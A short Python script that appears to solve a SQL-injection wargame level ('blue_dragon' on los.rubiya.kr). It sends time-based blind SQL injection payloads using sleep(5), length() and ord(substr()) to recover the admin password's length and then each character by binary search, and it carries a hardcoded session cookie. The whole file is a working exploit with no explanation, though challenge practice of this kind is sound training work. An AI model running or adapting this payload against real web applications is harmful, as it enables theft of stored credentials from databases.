import requests

session = requests.Session()
cookies = {"PHPSESSID": "t3ph90fkrspl4c71i1b8re936n"}
find="pw"

base_url = "https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php?id=admin"

payload = base_url + "' and if((length({0})={1}),sleep(5),null) --+"
for i in range(1, 100):
    print(i, end='\r')
    url = payload.format(find, i)
    response = requests.get(url, cookies=cookies)
    time = response.elapsed.total_seconds()
    if (time > 5):
        print("Length :", i)
        leng = i
        break
payload = base_url+"' and if((ord(substr({0},{1},1))>={2}),sleep(5),null) --+"
name = ""
for i in range(1, leng+1):
    mini = 48
    maxi = 128
    while(maxi > mini):
        mid = int((maxi+mini)/2)
        url = payload.format(find, i, mid)
        response = requests.get(url, cookies=cookies)
        time = response.elapsed.total_seconds()
        if (time > 5):
            if(maxi-mini > 1):
                mini = mid
            else:
                maxi = mini
        else:
            maxi = mid
    name += chr(mid)
    print("Password : "+name,end="\r")
print("Password : "+name)
